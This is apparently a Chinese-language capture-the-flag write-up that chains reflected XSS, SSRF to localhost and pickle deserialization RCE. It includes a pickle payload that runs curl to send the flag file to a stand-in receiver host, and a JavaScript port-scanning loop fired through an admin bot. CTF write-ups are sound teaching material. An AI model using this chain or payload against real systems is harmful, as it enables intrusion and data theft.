# Triple Whammy

## 题目简述

题目由三层漏洞组成：主页把 `name` 原样反射，形成 XSS；管理员 Cookie 才能调用 `/query`，该端点允许请求 `127.0.0.1`，形成 SSRF；内部服务随机监听 5700—6000 端口，并对十六进制参数执行 `pickle.loads`，可触发反序列化 RCE。

## 解题过程

先生成恶意 pickle。反序列化时令 `os.system` 外带 `/ctf/flag.txt`：

```python
import os, pickle

class Exploit:
    def __reduce__(self):
        cmd = "curl https://receiver.example/flag?$(cat /ctf/flag.txt)"
        return os.system, (cmd,)

pickle_hex = pickle.dumps(Exploit()).hex()
```

XSS 脚本在管理员同源上下文中对全部 301 个候选端口调用 `/query`。每次提交的 JSON URL 都满足服务端只允许 `http(s)://127.0.0.1` 的检查：

```javascript
for (let port = 5700; port <= 6000; port++) {
  fetch('/query', {
    method: 'POST',
    headers: {'Content-Type': 'application/json'},
    body: JSON.stringify({
      url: `http://127.0.0.1:${port}/pickle?pickle=PICKLE_HEX`
    })
  });
}
```

把脚本放进 `?name=<script>...</script>`，URL 编码后交给管理员机器人。浏览器携带 HttpOnly secret 调用 `/query`；命中真实内部端口时，服务解析 hex 并执行 pickle reduce，接收端得到：

```text
byuctf{you_got_a_turkey!!!}
```

## 方法总结

三处漏洞分别跨越浏览器身份边界、网络边界和代码执行边界。SSRF 响应内容不可见也不妨碍带副作用的 RCE；随机 301 端口不是安全控制，有限范围并发探测即可覆盖。
